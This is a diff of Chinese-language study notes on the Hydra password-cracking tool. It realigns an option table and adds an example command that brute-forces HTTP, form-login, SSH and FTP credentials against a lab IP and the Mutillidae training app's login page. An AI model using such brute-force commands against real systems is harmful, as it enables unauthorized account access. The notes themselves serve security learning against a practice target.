@@ -30,19 +30,26 @@
 
 	hydra   [options]	IP  ServiceName
 			
-				-L <FILE>   	指定用户名字典
+				-L <FILE>   	        指定用户名字典
 				-P <FILE>		指定密码字典
 				-C <FILE>		指定用户:密码文件
 				-t <TASKS>		同时运行的线程数，默认为16
 				-v / -V			显示详细过程
 				-o <FILE>		指定结果输出文件
 				-l <LOGIN>		指定破解的用户，对特定用户破解
-				-f				找到第一对登录名或者密码的时候中止破解
+				-f			找到第一对登录名或者密码的时候中止破解
 				-s <PORT>		可通过这个参数指定非默认端口
 				-e [n|s]		可选选项，n：空密码试探，s：使用指定用户和密码试探
+
+4.实例
+
+	hydra -L uesr -P password 172.16.2.130 
+		http-get "/admin/index.php"
+		http-form-post "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASSWORD^&login-php-submit-button=Login:<td id="id-authentication-failed-td" colspan="2" class="error-message">Account does not exist</td>"
+		ssh/ftp
+			
 				
-				
-4.支持的server
+5.支持的server
 
 	AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, FTPS,
 	HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY,
